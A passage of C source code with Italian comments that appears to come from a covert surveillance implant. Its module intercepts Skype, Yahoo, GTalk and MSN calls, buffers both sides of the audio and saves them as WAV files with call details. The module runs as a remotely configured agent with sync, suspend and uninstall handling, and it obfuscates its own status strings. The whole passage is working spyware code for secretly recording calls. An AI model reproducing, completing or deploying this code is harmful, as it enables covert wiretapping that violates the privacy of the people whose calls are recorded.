			// Termina ogni chiamata esistente 
			EndCall();
			FreePartnerList(&call_list_head);

		}
		else if (strstr((char*)msg, id_local_hold) || strstr((char*)msg, id_remotehold) || strstr((char*)msg, id_finished)) {
			// Una chiamata e' stata terminata o messa in attesa
			partner_entry** curr_partner, * tmp_partner;
			sscanf((char*)msg, format_call_stat, &call_id, req_buf);

			for (curr_partner = &call_list_head; *curr_partner; curr_partner = &((*curr_partner)->next))
				if ((*curr_partner)->Id == call_id) {
					EndCall(); // E' cambiata la lista degli interlocutori, quindi
							   // forza il salvataggio della chiamata
					// Togliamo un elemento dalla lista degli interlocutori
					SAFE_FREE((*curr_partner)->peer);
					tmp_partner = *curr_partner;
					*curr_partner = (*curr_partner)->next;
					SAFE_FREE(tmp_partner);
					break;
				}
		}
		else if (strstr((char*)msg, id_partic_count)) {
			// Skype ci ha risposto dicendo quante persone stanno partecipando a una chiamata (da remoto)

			DWORD participant_count;
			partner_entry* curr_partner;
			sscanf((char*)msg, format_call_part, &call_id, &participant_count);
			for (curr_partner = call_list_head; curr_partner; curr_partner = curr_partner->next)
				if (curr_partner->Id == call_id) {
					if (participant_count > 0)
						curr_partner->participants = participant_count - 1;
					else
						curr_partner->participants = 0;
					break;
				}
		}
		return TRUE;
	}
	if (*pdwFlags & FLAGS_SKAPI_WND) {
		ScrambleString ss(string_obfs, shared.is_demo_version); // "- Monitoring VOIP queues.............OK\r\n"
		REPORT_STATUS_LOG(ss.get_str());
		skype_api_wnd = *((HWND*)msg);
		return TRUE;
	}
	if (*pdwFlags & FLAGS_SKAPI_SWD) {
		skype_pm_wnd = *((HWND*)msg);
		return TRUE;
	}
	if (*pdwFlags & FLAGS_SKAPI_INI) {
		// Skype e' ripartito. Salviamo eventuali code e azzeriamo la lista 
		// dei partner
		EndCall();
		FreePartnerList(&call_list_head);
		return TRUE;
	}

	// Se abbiamo ricevuto un chunk audio tramite wsawrite o DirectSound, marca la chiamata come "old style"
	if ((((*pdwFlags) >> 24) & 0x3F) == VOIP_SKYPE && call_list_head &&
		(call_list_head->voip_program == VOIP_SKYPE || call_list_head->voip_program == VOIP_SKWSA)) {
		call_list_head->voip_program = VOIP_SKYPE;
		call_list_head->flags = CALL_SKYPE_OLD;
	}

	// Al primo chunk audio che riceve come SKYPE WASAPI cambia il voip program nella lista
	// dei peer, cosi' i chunk verranno accettati correttamente e nel file verra scritto il giusto
	// sample rate. Lo fa solo se non e' una chiamata "old style"
	if ((((*pdwFlags) >> 24) & 0x3F) == VOIP_SKWSA && call_list_head &&
		(call_list_head->voip_program == VOIP_SKYPE) && !(call_list_head->flags & CALL_SKYPE_OLD))
		call_list_head->voip_program = VOIP_SKWSA;

	return FALSE;
}


BOOL ParseSamplingMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags)
{
	DWORD in_out = INPUT_ELEM;
	if (*pdwFlags & FLAGS_SAMPLING) {

		if (*pdwFlags & FLAGS_OUTPUT)
			in_out = OUTPUT_ELEM;

		sample_sampling[in_out] = *((DWORD*)msg);
		return TRUE;
	}

	return FALSE;
}

DWORD __stdcall PM_VoipRecordDispatch(BYTE* msg, DWORD dwLen, DWORD dwFlags, FILETIME* time_nanosec)
{
	DWORD in_out = INPUT_ELEM;
	pVoiceAdditionalData additional_data;
	DWORD additional_len;

	// Se il monitor e' stoppato non esegue la funzione di dispatch
	if (!bPM_VoipRecordStarted)
		return 0;

	// Parsing per messaggi specifici di un programma
	if (ParseSkypeMsg(msg, &dwLen, &dwFlags))
		return 1;
	if (ParseYahooMsg(msg, &dwLen, &dwFlags))
		return 1;
	if (ParseGtalkMsg(msg, &dwLen, &dwFlags))
		return 1;
	if (ParseMsnMsg(msg, &dwLen, &dwFlags))
		return 1;

	// Intercetta i messaggi di sampling rate
	if (ParseSamplingMsg(msg, &dwLen, &dwFlags))
		return 1;

	// Registra solo se ci sono chiamate in corso
	if (!call_list_head)
		return 1;

	// Verifica che il chunk audio appartenga effettivamente al programma che viene usato verso il
	// primo elemento della lista dei peer 
	if (call_list_head->voip_program != ((dwFlags >> 24) & 0x3F))
		return 1;

	// Se non e' un messaggio di CallID allora determina da dove viene il sample
	if (dwFlags & FLAGS_OUTPUT)
		in_out = OUTPUT_ELEM; // Di default e' su INPUT_ELEM

	// Se e' troppo distante dall'ultimo sample, lo salva in un file differente
	// differente (appartiene a una chiamata diversa).
	// Se sample size e' > 0 sono sicuro che channel_time_last sia stato valorizzato
	if (sample_size[in_out] > 0 && abs(TimeDiff(time_nanosec, &channel_time_last[in_out])) > CALL_DELTA) {
		additional_data = VoipGetAdditionalData(call_list_head, in_out, &additional_len);
		SaveWav(wave_array[in_out], sample_size[in_out], sample_channels[in_out], additional_data, additional_len);
		sample_size[in_out] = 0;
	}

	// Se e' il primo messaggio che stiamo mettendo su quel canale, 
	// lo prendiamo come timestamp di inizio (approssimativamente)
	if (sample_size[in_out] == 0) {
		channel_time_start[in_out].dwHighDateTime = time_nanosec->dwHighDateTime;
		channel_time_start[in_out].dwLowDateTime = time_nanosec->dwLowDateTime;
	}
	// Setta l'ultimo time-stamp
	channel_time_last[in_out].dwHighDateTime = time_nanosec->dwHighDateTime;
	channel_time_last[in_out].dwLowDateTime = time_nanosec->dwLowDateTime;

	// Lo inserisce nella lista 
	if (InsertList(wave_array[in_out], msg, dwLen, sample_size[in_out])) {
		sample_size[in_out] += dwLen;
		sample_channels[in_out] = (dwFlags >> 30);
	}

	// Se ha superato la dimensione del sample, salva su file
	// e libera la lista
	if (sample_size[in_out] > max_sample_size) {
		additional_data = VoipGetAdditionalData(call_list_head, in_out, &additional_len);
		SaveWav(wave_array[in_out], sample_size[in_out], sample_channels[in_out], additional_data, additional_len);
		sample_size[in_out] = 0;
	}

	return 1;
}


DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
{
	char codec_path[DLLNAMELEN];
	pVoiceAdditionalData additional_data;
	DWORD additional_len;

	// Lo fa per prima cosa, anche se e' gia' in quello stato
	// Altrimenti quando gli agenti sono in suspended(per la sync) e ricevo una conf
	// che li mette in stop non verrebbero fermati realmente a causa del check
	// if (bPM_KeyLogStarted == bStartFlag) che considera suspended e stopped uguali.
	// Gli agenti IPC non vengono stoppati quando in suspend (cosi' cmq mettono in coda
	// durante la sync).
	if (bReset)
		AM_IPCAgentStartStop(PM_VOIPRECORDAGENT, bStartFlag);

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_VoipRecordStarted == bStartFlag)
		return 0;

	// Allo start vede se non abbiamo ancora il codec caricato
	// Se manca, cerca di caricarlo.
	if (bStartFlag && !codec_handle)
		codec_handle = ResolveCodecSymbols(HM_CompletePath(shared.H4_CODEC_NAME, codec_path));

	// Cambia lo stato dell'agente
	bPM_VoipRecordStarted = bStartFlag;

	// Quando stoppiamo l'agente flusha le due code di PCM...
	if (!bStartFlag) {
		for (DWORD i = 0; i < 2; i++) {
			if (sample_size[i] > 0) {
				additional_data = VoipGetAdditionalData(call_list_head, i, &additional_len);
				SaveWav(wave_array[i], sample_size[i], sample_channels[i], additional_data, additional_len);
				sample_size[i] = 0;
			}
		}
		// ... e stoppiamo il thread che monitora lo skypePM
		QUERY_CANCELLATION(hSkypePMThread, bPM_spmcp);
	}
	else { // bStartFlag == TRUE
		DWORD dummy;
		// Startiamo il thread che monitora lo skypePM
		hSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, (DWORD*)&bPM_spmcp, 0, 0);
	}

	return 1;
}


DWORD __stdcall PM_VoipRecordInit(JSONObject elem)
{
	// Inizializza la dimensione dei sample su disco
	// e il fattore di compressione
	max_sample_size = (DWORD)elem[L"buffer"]->AsNumber();
	compress_factor = (DWORD)elem[L"compression"]->AsNumber();

	// Riallochiamo l'array per i PCM
	// Siamo sicuri di non perdere dati, perche' la Init viene fatta sempre dopo lo Stop
	// Che avra' flushato entrambe le code e in questo momento il thread di dispatch e' ancora fermo
	SAFE_FREE(wave_array[INPUT_ELEM]);
	SAFE_FREE(wave_array[OUTPUT_ELEM]);
	wave_array[INPUT_ELEM] = (BYTE*)malloc(max_sample_size + MAX_MSG_LEN * 2);
	wave_array[OUTPUT_ELEM] = (BYTE*)malloc(max_sample_size + MAX_MSG_LEN * 2);
	return 1;
}

DWORD __stdcall PM_VoipRecordUnregister()
{
#define MAX_FREE_TRIES 5
#define FREE_SLEEP_TIME 100
	DWORD i;
	if (codec_handle) {
		// Cerca a tutti i costi di chiudere la libreria
		// (anche se dovrebbe riuscire al primo tentativo)
		for (i = 0; i < MAX_FREE_TRIES; i++) {
			// Non vi sono race sulla libreria visto che il thread di dispatch
			// e' bloccato a questo punto (in maniera sicura) e la Start (dove
			// carica la libreria) viene sempre eseguita da una action (cosi' 
			// come la unregisterm che e' esguita dall'action uninstall).
			if (FreeLibrary(codec_handle))
				break;
			Sleep(FREE_SLEEP_TIME);
		}
		codec_handle = NULL;
	}
	return 1;
}

void PM_VoipRecordRegister()
{
	AM_MonitorRegister(L"call", PM_VOIPRECORDAGENT, (BYTE*)PM_VoipRecordDispatch, (BYTE*)PM_VoipRecordStartStop, (BYTE*)PM_VoipRecordInit, (BYTE*)PM_VoipRecordUnregister);
	InitializeCriticalSection(&skype_critic_sec);
}